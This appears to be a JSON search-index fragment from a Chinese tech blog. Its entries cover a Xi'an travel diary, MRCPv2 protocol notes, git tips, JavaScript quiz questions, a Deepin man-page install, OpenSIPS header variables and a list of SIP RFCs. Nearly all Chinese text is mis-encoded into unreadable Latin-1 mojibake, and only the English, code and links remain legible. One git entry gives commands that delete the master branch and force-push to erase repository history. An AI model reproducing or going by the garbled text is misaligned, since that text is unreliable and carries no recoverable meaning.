å°±ä¸æ‡‚äº†å§ï¼Œå•¥éƒ½å†™æ¸…æ¥šï¼Œä¸€ä¸ªä¸€ä¸ªç‚¹æ‰“å¡å¤šæ²¡æ„æ€ã€‚\nday3 åæ¸…å®« å…µé©¬ä¿‘ é•¿æ¨æ­Œ ç”±äºè¥¿å®‰æ”»ç•¥åšçš„å¤ªè¿‡è‚¤æµ…ï¼Œæ‰€ä»¥ç¬¬äºŒå¤©æ™šä¸Šå†³å®šç›´æ¥è·Ÿå›¢ã€‚åœ¨ç½‘ä¸Šä¹°äº†ä¸¤å¼ åæ¸…å®«å…µé©¬ä¿‘å’Œé•¿æ¨æ­Œçš„ä¸€æ—¥æ¸¸ã€‚\nè¯´å®åœ¨çš„ï¼Œåæ¸…å®«æ²¡å•¥æ„æ€ï¼Œéƒ½æ˜¯æ´—æ¾¡æ± å­ã€‚\nè’‹ä»‹çŸ³æ´—è¿‡æ¾¡çš„æ± å­ï¼Œæ¨è´µå¦ƒçš„æ´—æ¾¡æ± å­ï¼Œå”æ˜çš‡çš„æ´—æ¾¡æ± å­ï¼Œå¤§è‡£ä»¬çš„æ´—æ¾¡æ± å­ã€‚\né€›å®Œä¹‹åï¼Œä¸‹åˆæˆ‘ä»¬åç€æ—…æ¸¸å¤§å·´ï¼Œå‰å¾€å…µé©¬ä¿‘ã€‚\nä¸€å·å‘\nä¸€å·å‘\nä¸€å·å‘\nä¸€å·å‘\nä¸€å·å‘\nå…µé©¬ä¿‘æœ‰ä¸‰ä¸ªå‘ã€‚\nä¸€å·å‘æœ€å¤§ï¼Œå…µé©¬ä¿‘ä¹Ÿæ˜¯æœ€å¤šçš„ã€‚ç„¶è€Œå½“æ—¶æ¸¸å®¢æ¯”è‚©æ¥è¸µï¼ŒåŠ ä¸Šå¤©æ°”ç‚çƒ­ï¼Œå¤§å®¶éƒ½åœ¨é‡Œé¢åƒè’¸æ¡‘æ‹¿ä¸€æ ·ã€‚\nå‡ºäº†ä¸€å·å‘ï¼Œæˆ‘å¿ƒé‡Œæƒ³ï¼šè¿™ä¹ˆå¤§ä¸ªå‘ï¼Œè¿™ä¹ˆçƒ­ä¸ºå•¥ä¸è£…ç©ºè°ƒï¼Œéš¾é“æ˜¯å› ä¸ºè¦ä¿æŠ¤æ–‡ç‰©å—ï¼Ÿ\nåæ¥æ®åšç‰©é¦†çš„è®²è§£å‘˜ä»‹ç»ï¼šä¸è£…ç©ºè°ƒæ˜¯å› ä¸ºå®¡æ ¸æ‰‹ç»­å¤æ‚ï¼Œå¯èƒ½è¦è¦ä¸ªå‡ åå¹´æ‰‹ç»­æ‰èƒ½å®Œæˆã€‚åƒäºŒå·å‘å’Œä¸‰å·å‘éƒ½å·²ç»è£…å¥½ç©ºè°ƒäº†ã€‚\näºŒå·å‘çœŸçš„æ˜¯ä¸ªå‘ï¼Œæ²¡æœ‰å…µé©¬ä¿‘ï¼Œä»…ä»…æ˜¯ä¸ªå¤§å‘ã€‚\nä¸‰å·å‘æ¯”è¾ƒå°ï¼Œä»…æœ‰å‡ ä¸ªé™¶ä¿‘ã€‚\né•¿æ¨æ­Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªå¤§å‹çš„å®¤å¤–è¡¨æ¼”ï¼Œç”±ç™½å±…æ˜“çš„ã€Šé•¿æ¨æ­Œã€‹æ¼”ç»è€Œæ¥ï¼Œè®²è¿°å”æ˜çš‡å’Œæ¨è´µå¦ƒçš„çˆ±æ¨æƒ…é•¿ã€‚ç¯å…‰ç»šä¸½ï¼Œèˆè¹ˆä¼˜ç¾ï¼Œæ„Ÿäººè‡³æ·±ã€‚\nå…³äºè¥¿å®‰ç¾é£Ÿå°±å¾ˆå¤šäº†\næ¯›ç¬”é…¥\nå…­å¤§ç¢—\næ¯›ç¬”é…¥ é…¸æ¢…æ±¤\n","permalink":"https://wdd.js.org/posts/2022/12/xian-travel/","summary":"ä¸€å¹´è¿‡åŠä»¥åï¼Œå¶ç„¶æ‰“å¼€å¾®ä¿¡å…¬ä¼—å·ï¼Œçœ‹åˆ°è‰ç¨¿ç®±é‡Œçš„ç¯‡æ–‡ç« ã€‚æˆ‘æ‰å›æƒ³èµ·å»å¹´å¸¦å¥³å‹å»è¥¿å®‰çš„é‚£ä¸ªé¥è¿œçš„å¤å¤©ã€‚\nå¦‚ä»Šå¥³å‹å·²ç»å˜æˆè€å©†ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘æ‰æƒ³èµ·æ¥å‘è¡¨ã€‚\nday 1 é’Ÿæ¥¼ é¼“æ¥¼ å›æ°‘è¡— é‚£æ˜¯å…­æœˆæœ«çš„æ—¶å€™ï¼Œå’Œå¥³å‹ä¸€èµ·åç«è½¦å»äº†è¶Ÿè¥¿å®‰ã€‚\nä¸ºä»€ä¹ˆè¦å»è¥¿å®‰å‘¢ï¼Ÿæ®åƒè´§å¥³å‹è¯´ï¼Œè¥¿å®‰æœ‰éå¸¸å¤šçš„å¥½åƒçš„ã€‚æ‰€ä»¥äººç”Ÿæ˜¯å¿…é¡»è¦å»ä¸€è¶Ÿçš„ã€‚\næ¸…æ™¨ï¼Œæˆ‘ä»¬ä»å—äº¬å—ç«™å‡ºå‘ååŠ¨è½¦ï¼Œä¸€è·¯å‘è¥¿ï¼Œåäº†5ä¸ªå¤šå°æ—¶ï¼Œåˆ°è¾¾è¥¿å®‰åŒ—ç«™ã€‚\nè·¯ä¸Šæˆ‘å¸¦äº†ä¸€ä¸ª1500mlçš„æ°´ç“¶ï¼Œä»¥åŠ1500mlçš„é…¸å¥¶ã€‚\nå¥³å‹åæ§½è¯´ï¼Œè¿˜å¥½æ²¡åšé£æœºï¼Œä¸ç„¶æˆ‘å°±åƒå®å¼ºä¸€æ ·ï¼Œè¦åœ¨æœºåœºå¹²å®Œä¸€å¤§ç“¶é…¸å¥¶äº†ã€‚\nä¸‹äº†åŠ¨è½¦ï¼Œç«‹å³å‰å¾€é’Ÿæ¥¼è®¢çš„å®¾é¦†ï¼Œæ”¾ç½®è¡Œæã€‚\nè¥¿å®‰é’Ÿæ¥¼ä½äºè¥¿å®‰å¸‚ä¸­å¿ƒï¼Œæ˜¯ä¸­å›½ç°å­˜é’Ÿæ¥¼ä¸­å½¢åˆ¶æœ€å¤§ã€ä¿å­˜æœ€å®Œæ•´çš„ä¸€åº§ã€‚å»ºäºæ˜å¤ªç¥–æ´ªæ­¦åä¸ƒå¹´ï¼Œåˆå»ºäºä»Šå¹¿æµè¡—å£ï¼Œä¸é¼“æ¥¼ç›¸å¯¹ï¼Œæ˜ç¥å®—ä¸‡å†åå¹´æ•´ä½“è¿ç§»äºä»Šå€ã€‚\næ²¿ç€é’Ÿæ¥¼é™„è¿‘ï¼Œæˆ‘ä»¬é€›äº†ä¸€åœˆå›æ°‘è¡—ã€‚\nå›æ°‘è¡—æ˜¯è¥¿å®‰è‘—åçš„ç¾é£Ÿæ–‡åŒ–è¡—åŒºï¼Œæ˜¯è¥¿å®‰å°åƒè¡—åŒºã€‚\nè¥¿å®‰å›æ°‘è¡—ä½œä¸ºè¥¿å®‰é£æƒ…çš„ä»£è¡¨ä¹‹ä¸€ï¼Œæ˜¯å›æ°‘è¡—åŒºå¤šæ¡è¡—é“çš„ç»Ÿç§°ï¼Œç”±åŒ—å¹¿æµè¡—ã€åŒ—é™¢é—¨ã€è¥¿ç¾Šå¸‚ã€å¤§çš®é™¢ã€åŒ–è§‰å··ã€æ´’é‡‘æ¡¥ç­‰æ•°æ¡è¡—é“ç»„æˆï¼Œåœ¨é’Ÿé¼“æ¥¼åã€‚\né’Ÿæ¥¼\nday 2 å¤§å”èŠ™è“‰åŸ å¤§å”ä¸å¤œåŸ å¤§é›å¡” å¤§å”èŠ™è“‰åŸæ˜¯ä¸€åº§ä»¿å”å»ºç­‘ï¼Œé‡Œé¢æœ‰è®¸å¤šæ™¯ç‚¹ï¼Œæˆ–è®¸æˆ‘ä»¬ä¸åº”è¯¥æ—©ä¸Šæ¥ï¼Œå› ä¸ºä¸Šåˆå¤ªçƒ­äº†ã€‚\nå”¯ä¸€åº†å¹¸çš„æ˜¯ï¼Œæˆ‘ä»¬å¸¦äº†ä¸€ä¸ªå¾ˆå¤§çš„æ°´æ¯ï¼Œè€Œä¸”èŠ™è“‰åŸé‡Œæä¾›å…è´¹çš„å¼€æ°´ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰æ²¡æœ‰è¢«æ¸´æ­»ã€‚\nå¤§å”èŠ™è“‰åŸ è¥¿æ¸¸å¸ˆå¾’å››äºº é›•å¡‘\nå‚æ™šçš„ å¤§å”ä¸å¤œåŸ\nå¤œå¹•é™ä¸´çš„ å¤§å”ä¸å¤œåŸ\né—æ†¾ä¹‹ä¸€ï¼šå¤§é›å¡”æ²¡æœ‰å»çœ‹ï¼Œå› ä¸ºå½“æ—¶æ­£åœ¨ç»´ä¿®ï¼Œå‘¨å›´å…¨æ˜¯è„šæ‰‹æ¶ã€‚ é—æ†¾ä¹‹äºŒï¼šæ²¡æœ‰åˆ°é™•è¥¿å†å²åšç‰©é¦†çœ‹çœ‹ï¼Œå› ä¸ºæ²¡æœ‰æ—©ç‚¹é¢„çº¦\nå¥³å‹åŸ‹æ€¨æˆ‘è¯´æˆ‘ä¸æ—©ç‚¹åšæ”»ç•¥ï¼Œå®³å¾—è¿™ä¹ˆå¤šæ™¯ç‚¹å»ä¸äº†ã€‚\næˆ‘è¯´æˆ‘æ˜¯åšäº†æ”»ç•¥çš„ï¼Œè¿˜è®°åœ¨å¤‡å¿˜å½•é‡Œé¢å‘¢ã€‚\nå¥³å‹æ‰“å¼€æˆ‘çš„å¤‡å¿˜å½•ä¸€çœ‹ï¼Œç¬‘å‡ºçœ¼æ³ªè¯´ï¼šä½ åšçš„å•¥ç‹—å±æ”»ç•¥ï¼Œå°±è¿™å‡ ä¸ªå­—ï¼ç”·äººæœç„¶é ä¸ä½ï¼\næˆ‘è¯´: è¿™ä½ å°±ä¸æ‡‚äº†å§ï¼Œå•¥éƒ½å†™æ¸…æ¥šï¼Œä¸€ä¸ªä¸€ä¸ªç‚¹æ‰“å¡å¤šæ²¡æ„æ€ã€‚\nday3 åæ¸…å®« å…µé©¬ä¿‘ é•¿æ¨æ­Œ ç”±äºè¥¿å®‰æ”»ç•¥åšçš„å¤ªè¿‡è‚¤æµ…ï¼Œæ‰€ä»¥ç¬¬äºŒå¤©æ™šä¸Šå†³å®šç›´æ¥è·Ÿå›¢ã€‚åœ¨ç½‘ä¸Šä¹°äº†ä¸¤å¼ åæ¸…å®«å…µé©¬ä¿‘å’Œé•¿æ¨æ­Œçš„ä¸€æ—¥æ¸¸ã€‚\nè¯´å®åœ¨çš„ï¼Œåæ¸…å®«æ²¡å•¥æ„æ€ï¼Œéƒ½æ˜¯æ´—æ¾¡æ± å­ã€‚\nè’‹ä»‹çŸ³æ´—è¿‡æ¾¡çš„æ± å­ï¼Œæ¨è´µå¦ƒçš„æ´—æ¾¡æ± å­ï¼Œå”æ˜çš‡çš„æ´—æ¾¡æ± å­ï¼Œå¤§è‡£ä»¬çš„æ´—æ¾¡æ± å­ã€‚\né€›å®Œä¹‹åï¼Œä¸‹åˆæˆ‘ä»¬åç€æ—…æ¸¸å¤§å·´ï¼Œå‰å¾€å…µé©¬ä¿‘ã€‚\nä¸€å·å‘\nä¸€å·å‘\nä¸€å·å‘\nä¸€å·å‘\nä¸€å·å‘\nå…µé©¬ä¿‘æœ‰ä¸‰ä¸ªå‘ã€‚\nä¸€å·å‘æœ€å¤§ï¼Œå…µé©¬ä¿‘ä¹Ÿæ˜¯æœ€å¤šçš„ã€‚ç„¶è€Œå½“æ—¶æ¸¸å®¢æ¯”è‚©æ¥è¸µï¼ŒåŠ ä¸Šå¤©æ°”ç‚çƒ­ï¼Œå¤§å®¶éƒ½åœ¨é‡Œé¢åƒè’¸æ¡‘æ‹¿ä¸€æ ·ã€‚\nå‡ºäº†ä¸€å·å‘ï¼Œæˆ‘å¿ƒé‡Œæƒ³ï¼šè¿™ä¹ˆå¤§ä¸ªå‘ï¼Œè¿™ä¹ˆçƒ­ä¸ºå•¥ä¸è£…ç©ºè°ƒï¼Œéš¾é“æ˜¯å› ä¸ºè¦ä¿æŠ¤æ–‡ç‰©å—ï¼Ÿ\nåæ¥æ®åšç‰©é¦†çš„è®²è§£å‘˜ä»‹ç»ï¼šä¸è£…ç©ºè°ƒæ˜¯å› ä¸ºå®¡æ ¸æ‰‹ç»­å¤æ‚ï¼Œå¯èƒ½è¦è¦ä¸ªå‡ åå¹´æ‰‹ç»­æ‰èƒ½å®Œæˆã€‚åƒäºŒå·å‘å’Œä¸‰å·å‘éƒ½å·²ç»è£…å¥½ç©ºè°ƒäº†ã€‚\näºŒå·å‘çœŸçš„æ˜¯ä¸ªå‘ï¼Œæ²¡æœ‰å…µé©¬ä¿‘ï¼Œä»…ä»…æ˜¯ä¸ªå¤§å‘ã€‚\nä¸‰å·å‘æ¯”è¾ƒå°ï¼Œä»…æœ‰å‡ ä¸ªé™¶ä¿‘ã€‚\né•¿æ¨æ­Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªå¤§å‹çš„å®¤å¤–è¡¨æ¼”ï¼Œç”±ç™½å±…æ˜“çš„ã€Šé•¿æ¨æ­Œã€‹æ¼”ç»è€Œæ¥ï¼Œè®²è¿°å”æ˜çš‡å’Œæ¨è´µå¦ƒçš„çˆ±æ¨æƒ…é•¿ã€‚ç¯å…‰ç»šä¸½ï¼Œèˆè¹ˆä¼˜ç¾ï¼Œæ„Ÿäººè‡³æ·±ã€‚\nå…³äºè¥¿å®‰ç¾é£Ÿå°±å¾ˆå¤šäº†\næ¯›ç¬”é…¥\nå…­å¤§ç¢—\næ¯›ç¬”é…¥ é…¸æ¢…æ±¤","title":"è¥¿å®‰ä¹‹æ—… ä¸ä»…æœ‰ç¾Šè‚‰æ³¡é¦ ä¹Ÿæœ‰é•¿æ¨æ­Œ"},{"content":"ç®€ä»‹ MRCPv2 æ˜¯Media Resource Control Protocol Version 2çš„ç¼©å†™ MRCP å…è®¸å®¢æˆ·ç«¯å»æ“ä½œæœåŠ¡ç«¯çš„åª’ä½“èµ„æºå¤„ç† MRCP çš„å¸¸è§åŠŸèƒ½å¦‚ä¸‹ æ–‡æœ¬è½¬è¯­éŸ³ è¯­éŸ³è¯†åˆ« è¯´è¯äººè¯†åˆ« è¯­éŸ³è®¤è¯ ç­‰ç­‰ MRCP å¹¶ä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åè®®ï¼Œè€Œæ˜¯ä¾èµ–äºå…¶ä»–çš„åè®®ï¼Œå¦‚ SIP/SDP MRCPv2 RFC å‘è¡¨äº 2012 å¹´ MRCPv2 ä¸»è¦ç”±æ€ç§‘,Nuance,Speechworks å¼€å‘ MRCPv2 æ˜¯åŸºäº MRCPv1 å¼€å‘çš„ MRCPv2 ä¸å…¼å®¹ MRCPv1 MRCPv2 åœ¨ä¼ è¾“å±‚ä½¿ç”¨ TCP æˆ–è€… TLS å®šä¹‰ åª’ä½“èµ„æºï¼š An entity on the speech processing server that can be controlled through MRCPv2. MRCP æœåŠ¡å™¨ï¼š Aggregate of one or more \u0026ldquo;Media Resource\u0026rdquo; entities on a server, exposed through MRCPv2. Often, \u0026lsquo;server\u0026rsquo; in this document refers to an MRCP server. MRCP å®¢æˆ·ç«¯: An entity controlling one or more Media Resources through MRCPv2 (\u0026ldquo;Client\u0026rdquo; for short). DTMF: Dual-Tone Multi-Frequency; a method of transmitting key presses in-band, either as actual tones (Q.23 [Q.23]) or as named tone events (RFC 4733 [RFC4733]). Endpointing: The process of automatically detecting the beginning and end of speech in an audio stream. This is critical both for speech recognition and for automated recording as one would find in voice mail systems. Hotword Mode: A mode of speech recognition where a stream of utterances is evaluated for match against a small set of command words. This is generally employed either to trigger some action or to control the subsequent grammar to be used for further recognition. æ¶æ„ å®¢æˆ·ç«¯ä½¿ç”¨SIP/SDPå»ºç«‹MRCPæ§åˆ¶é€šé“ SIPä½¿ç”¨SDPçš„offer/answeræ¨¡å‹æ¥æè¿°MRCPé€šé“çš„å‚æ•° æœåŠ¡ç«¯åœ¨answer SDPä¸­æä¾›å”¯ä¸€çš„é€šé“IDå’ŒæœåŠ¡ç«¯TCPç«¯å£å· å®¢æˆ·ç«¯å¯ä»¥å¼€å¯ä¸€ä¸ªæ–°çš„TCPé“¾æ¥ï¼Œå¤šä¸ªMRCPé€šé“ä¹Ÿå¯ä»¥å…±äº«ä¸€ä¸ªTCPé“¾æ¥ ç®¡ç†èµ„æºæ§åˆ¶é€šé“ This \u0026ldquo;m=\u0026rdquo; line MUST have a media type field of \u0026ldquo;application\u0026rdquo; transport type field of either \u0026ldquo;TCP/MRCPv2\u0026rdquo; or \u0026ldquo;TCP/TLS/MRCPv2\u0026rdquo; The port number field of the \u0026ldquo;m=\u0026rdquo; line MUST contain the \u0026ldquo;discard\u0026rdquo; port of the transport protocol (port 9 for TCP) in the SDP offer from the client MUST contain the TCP listen port on the server in the SDP answer MRCPv2 servers MUST NOT assume any relationship between resources using the same port other than the sharing of the communication channel. To remain backwards compatible with conventional SDP usage, the format field of the \u0026ldquo;m=\u0026rdquo; line MUST have the arbitrarily selected value of \u0026ldquo;1\u0026rdquo;. The a=connection attribute MUST have a value of \u0026ldquo;new\u0026rdquo; on the very first control \u0026ldquo;m=\u0026rdquo; line offer from the client to an MRCPv2 server Subsequent control \u0026ldquo;m=\u0026rdquo; line offers from the client to the MRCP server MAY contain \u0026ldquo;new\u0026rdquo; or \u0026ldquo;existing\u0026rdquo;, depending on whether the client wants to set up a new connection or share an existing connection When the client wants to deallocate the resource from this session, it issues a new SDP offer, according to RFC 3264 [RFC3264], where the control \u0026ldquo;m=\u0026rdquo; line port MUST be set to 0 When the client wants to tear down the whole session and all its resources, it MUST issue a SIP BYE request to close the SIP session. This will deallocate all the control channels and resources allocated under the session. MRCPv2 Session Termination If an MRCP client notices that the underlying connection has been closed for one of its MRCP channels, and it has not previously initiated a re-INVITE to close that channel, it MUST send a BYE to close down the SIP dialog and all other MRCP channels. If an MRCP server notices that the underlying connection has been closed for one of its MRCP channels, and it has not previously received and accepted a re-INVITE closing that channel, then it MUST send a BYE to close down the SIP dialog and all other MRCP channels.\nMRCP request request-line = mrcp-version SP message-length SP method-name SP request-id CRLF request-id = 1*10DIGIT MRCP response response-line = mrcp-version SP message-length SP request-id SP status-code SP request-state CRLF status-code = 3DIGIT request-state = \u0026ldquo;COMPLETE\u0026rdquo; / \u0026ldquo;IN-PROGRESS\u0026rdquo; / \u0026ldquo;PENDING\u0026rdquo; event event-line = mrcp-version SP message-length SP event-name SP request-id SP request-state CRLF event-name = synthesizer-event / recognizer-event / recorder-event / verifier-event å‚è€ƒ https://www.rfc-editor.org/rfc/rfc6787 ","permalink":"https://wdd.js.org/posts/2022/12/mrcp-notes/","summary":"ç®€ä»‹ MRCPv2 æ˜¯Media Resource Control Protocol Version 2çš„ç¼©å†™ MRCP å…è®¸å®¢æˆ·ç«¯å»æ“ä½œæœåŠ¡ç«¯çš„åª’ä½“èµ„æºå¤„ç† MRCP çš„å¸¸è§åŠŸèƒ½å¦‚ä¸‹ æ–‡æœ¬è½¬è¯­éŸ³ è¯­éŸ³è¯†åˆ« è¯´è¯äººè¯†åˆ« è¯­éŸ³è®¤è¯ ç­‰ç­‰ MRCP å¹¶ä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åè®®ï¼Œè€Œæ˜¯ä¾èµ–äºå…¶ä»–çš„åè®®ï¼Œå¦‚ SIP/SDP MRCPv2 RFC å‘è¡¨äº 2012 å¹´ MRCPv2 ä¸»è¦ç”±æ€ç§‘,Nuance,Speechworks å¼€å‘ MRCPv2 æ˜¯åŸºäº MRCPv1 å¼€å‘çš„ MRCPv2 ä¸å…¼å®¹ MRCPv1 MRCPv2 åœ¨ä¼ è¾“å±‚ä½¿ç”¨ TCP æˆ–è€… TLS å®šä¹‰ åª’ä½“èµ„æºï¼š An entity on the speech processing server that can be controlled through MRCPv2. MRCP æœåŠ¡å™¨ï¼š Aggregate of one or more \u0026ldquo;Media Resource\u0026rdquo; entities on a server, exposed through MRCPv2.","title":"MRCPv2 åè®®å­¦ä¹ "},{"content":"æœ‰äº›æ—¶å€™ï¼Œgit ä»“åº“ç´¯ç§¯äº†å¤ªå¤šæ— ç”¨çš„å†å²æ›´æ”¹ï¼Œå¯¼è‡´ clone æ–‡ä»¶è¿‡å¤§ã€‚å¦‚æœç¡®å®šå†å²æ›´æ”¹æ²¡æœ‰æ„ä¹‰ï¼Œå¯ä»¥é‡‡ç”¨ä¸‹è¿°æ–¹æ³•æ¸…ç©ºå†å²ï¼Œ\nå…ˆ clone é¡¹ç›®åˆ°æœ¬åœ°ç›®å½• (ä»¥åä¸º mylearning çš„ä»“åº“ä¸ºä¾‹) git clone git@gitee.com:badboycoming/mylearning.git è¿›å…¥ mylearning ä»“åº“ï¼Œæ‹‰ä¸€ä¸ªåˆ†æ”¯ï¼Œæ¯”å¦‚åä¸º latest_branch git checkout --orphan latest_branch æ·»åŠ æ‰€æœ‰æ–‡ä»¶åˆ°ä¸Šè¿°åˆ†æ”¯ (Optional) git add -A æäº¤ä¸€æ¬¡ git commit -am \u0026#34;Initial commit.\u0026#34; åˆ é™¤ master åˆ†æ”¯ git branch -D master æ›´æ”¹å½“å‰åˆ†æ”¯ä¸º master åˆ†æ”¯ git branch -m master å°†æœ¬åœ°æ‰€æœ‰æ›´æ”¹ push åˆ°è¿œç¨‹ä»“åº“ git push -f origin master å…³è”æœ¬åœ° master åˆ°è¿œç¨‹ master git branch --set-upstream-to=origin/master ","permalink":"https://wdd.js.org/git/clean-all-history/","summary":"æœ‰äº›æ—¶å€™ï¼Œgit ä»“åº“ç´¯ç§¯äº†å¤ªå¤šæ— ç”¨çš„å†å²æ›´æ”¹ï¼Œå¯¼è‡´ clone æ–‡ä»¶è¿‡å¤§ã€‚å¦‚æœç¡®å®šå†å²æ›´æ”¹æ²¡æœ‰æ„ä¹‰ï¼Œå¯ä»¥é‡‡ç”¨ä¸‹è¿°æ–¹æ³•æ¸…ç©ºå†å²ï¼Œ\nå…ˆ clone é¡¹ç›®åˆ°æœ¬åœ°ç›®å½• (ä»¥åä¸º mylearning çš„ä»“åº“ä¸ºä¾‹) git clone git@gitee.com:badboycoming/mylearning.git è¿›å…¥ mylearning ä»“åº“ï¼Œæ‹‰ä¸€ä¸ªåˆ†æ”¯ï¼Œæ¯”å¦‚åä¸º latest_branch git checkout --orphan latest_branch æ·»åŠ æ‰€æœ‰æ–‡ä»¶åˆ°ä¸Šè¿°åˆ†æ”¯ (Optional) git add -A æäº¤ä¸€æ¬¡ git commit -am \u0026#34;Initial commit.\u0026#34; åˆ é™¤ master åˆ†æ”¯ git branch -D master æ›´æ”¹å½“å‰åˆ†æ”¯ä¸º master åˆ†æ”¯ git branch -m master å°†æœ¬åœ°æ‰€æœ‰æ›´æ”¹ push åˆ°è¿œç¨‹ä»“åº“ git push -f origin master å…³è”æœ¬åœ° master åˆ°è¿œç¨‹ master git branch --set-upstream-to=origin/master ","title":"æ¸…é™¤æ‰€æœ‰GITå†å²è®°å½•"},{"content":"git remote set-url origin repo-url ","permalink":"https://wdd.js.org/git/remote-url/","summary":"git remote set-url origin repo-url ","title":"GIT é‡æ–°è®¾ç½®è¿œç¨‹url"},{"content":"1. åˆ†æè¾“å‡º for (var i = 0; i \u0026lt; 3; i++) { setTimeout(() =\u0026gt; console.log(i), 1) } for (let i = 0; i \u0026lt; 3; i++) { setTimeout(() =\u0026gt; console.log(i), 1) } 2. åˆ†æè¾“å‡º const shape = { radius: 10, diameter() { return this.radius * 2 }, perimeter: () =\u0026gt; 2 * Math.PI * this.radius, } shape.diameter() shape.perimeter() 3. åˆ†æè¾“å‡º const a = {} function test1(a) { a = { name: \u0026#39;wdd\u0026#39;, } } function test2() { test1(a) } function test3() { console.log(a) } test2() test3() 4. åˆ†æè¾“å‡º class Chameleon { static colorChange(newColor) { this.newColor = newColor return this.newColor } constructor({ newColor = \u0026#39;green\u0026#39; } = {}) { this.newColor = newColor } } const freddie = new Chameleon({ newColor: \u0026#39;purple\u0026#39; }) freddie.colorChange(\u0026#39;orange\u0026#39;) 5. åˆ†æè¾“å‡º function Person(firstName, lastName) { this.firstName = firstName this.lastName = lastName } const member = new Person(\u0026#39;Lydia\u0026#39;, \u0026#39;Hallie\u0026#39;) Person.getFullName = function () { return `${this.firstName} ${this.lastName}` } console.log(member.getFullName()) 6. äº‹ä»¶ä¼ æ’­çš„ä¸‰ä¸ªé˜¶æ®µæ˜¯ä»€ä¹ˆï¼Ÿ A: Target \u0026gt; Capturing \u0026gt; Bubbling B: Bubbling \u0026gt; Target \u0026gt; Capturing C: Target \u0026gt; Bubbling \u0026gt; Capturing D: Capturing \u0026gt; Target \u0026gt; Bubbling 7. æ‰€æœ‰å¯¹è±¡éƒ½æœ‰åŸå‹ A: å¯¹ B: é”™\n8. è¾“å‡ºï¼Ÿ function sum(a, b) { return a + b } sum(1, \u0026#39;2\u0026#39;) 9. è¾“å‡ºï¼Ÿ function getPersonInfo(one, two, three) { console.log(one) console.log(two) console.log(three) } const person = \u0026#39;Lydia\u0026#39; const age = 21 getPersonInfo`${person} is ${age} years old` è¾“å‡ºï¼Ÿ function checkAge(data) { if (data === { age: 18 }) { console.log(\u0026#39;You are an adult!\u0026#39;) } else if (data == { age: 18 }) { console.log(\u0026#39;You are still an adult.\u0026#39;) } else { console.log(`Hmm.. You don\u0026#39;t have an age I guess`) } } checkAge({ age: 18 }) è¾“å‡ºï¼Ÿ function getAge(...args) { console.log(typeof args) } getAge(21) ","permalink":"https://wdd.js.org/fe/js-questions/","summary":"1. åˆ†æè¾“å‡º for (var i = 0; i \u0026lt; 3; i++) { setTimeout(() =\u0026gt; console.log(i), 1) } for (let i = 0; i \u0026lt; 3; i++) { setTimeout(() =\u0026gt; console.log(i), 1) } 2. åˆ†æè¾“å‡º const shape = { radius: 10, diameter() { return this.radius * 2 }, perimeter: () =\u0026gt; 2 * Math.PI * this.radius, } shape.diameter() shape.perimeter() 3. åˆ†æè¾“å‡º const a = {} function test1(a) { a = { name: \u0026#39;wdd\u0026#39;, } } function test2() { test1(a) } function test3() { console.","title":"JS è€ƒé¢˜"},{"content":"æƒ³æŸ¥èµ„æ–™ï¼Œå‘ç° deepin å±…ç„¶æ²¡æœ‰ man è¿™ä¸ªå‘½ä»¤ã€‚\nå®‰è£… sudo apt-get install man-db ä½¿ç”¨ä»‹ç» ","permalink":"https://wdd.js.org/posts/2022/11/deepin-install-man/","summary":"æƒ³æŸ¥èµ„æ–™ï¼Œå‘ç° deepin å±…ç„¶æ²¡æœ‰ man è¿™ä¸ªå‘½ä»¤ã€‚\nå®‰è£… sudo apt-get install man-db ä½¿ç”¨ä»‹ç» ","title":"Deepinå®‰è£…manå‘½ä»¤"},{"content":"è„šæœ¬å˜é‡ avp å˜é‡ ä¼ªå˜é‡ SIP å¤´, $(hrd(name)) $(hdr(name)[N]) - represents the body of the N-th header identified by \u0026rsquo;name\u0026rsquo;. If [N] is omitted then the body of the first header is printed. The first header is got when N=0, for the second N=1, a.s.o. To print the last header of that type, use -1, no other negative values are supported now. No white spaces are allowed inside the specifier (before }, before or after {, [, ] symbols). When N=\u0026rsquo;*\u0026rsquo;, all headers of that type are printed.\nThe module should identify most of compact header names (the ones recognized by OpenSIPS which should be all at this moment), if not, the compact form has to be specified explicitly. It is recommended to use dedicated specifiers for headers (e.g., %ua for user agent header), if they are available \u0026ndash; they are faster.\n$(hdrcnt(name)) \u0026ndash; returns number of headers of type given by \u0026rsquo;name\u0026rsquo;. Uses same rules for specifying header names as $hdr(name) above. Many headers (e.g., Via, Path, Record-Route) may appear more than once in the message. This variable returns the number of headers of a given type.\nNote that some headers (e.g., Path) may be joined together with commas and appear as a single header line. This variable counts the number of header lines, not header values.\nFor message fragment below, $hdrcnt(Path) will have value 2 and $(hdr(Path)[0]) will have value \u0026lt;a.com\u0026gt;:\nPath: \u0026lt;a.com\u0026gt; Path: \u0026lt;b.com\u0026gt; For message fragment below, $hdrcnt(Path) will have value 1 and $(hdr(Path)[0]) will have value \u0026lt;a.com\u0026gt;,\u0026lt;b.com\u0026gt;:\nPath: \u0026lt;a.com\u0026gt;,\u0026lt;b.com\u0026gt; Note that both examples above are semantically equivalent but the variables take on different values.\n","permalink":"https://wdd.js.org/2.4.x-docs/core-vars/","summary":"è„šæœ¬å˜é‡ avp å˜é‡ ä¼ªå˜é‡ SIP å¤´, $(hrd(name)) $(hdr(name)[N]) - represents the body of the N-th header identified by \u0026rsquo;name\u0026rsquo;. If [N] is omitted then the body of the first header is printed. The first header is got when N=0, for the second N=1, a.s.o. To print the last header of that type, use -1, no other negative values are supported now. No white spaces are allowed inside the specifier (before }, before or after {, [, ] symbols).","title":"æ ¸å¿ƒå˜é‡"},{"content":" RFC åç§° https://tools.ietf.org/html/rfc3261 SIP: Session Initiation Protocol https://tools.ietf.org/html/rfc3665 Session Initiation Protocol (SIP) Basic Call Flow Examples https://tools.ietf.org/html/rfc6141 Re-INVITE and Target-Refresh Request Handling in the Session Initiation Protocol (SIP) https://tools.ietf.org/html/rfc4566 SDP: Session Description Protocol https://tools.ietf.org/html/rfc4028 Session Timers in the Session Initiation Protocol (SIP) https://tools.ietf.org/html/rfc1889 RTP: A Transport Protocol for Real-Time Applications https://tools.ietf.org/html/rfc2326 Real Time Streaming Protocol (RTSP) https://tools.ietf.org/html/rfc2327 SDP: Session Description Protocol https://tools.ietf.org/html/rfc3015 Megaco Protocol Version 1.0 https://tools.ietf.org/html/rfc1918 Address Allocation for Private Internets 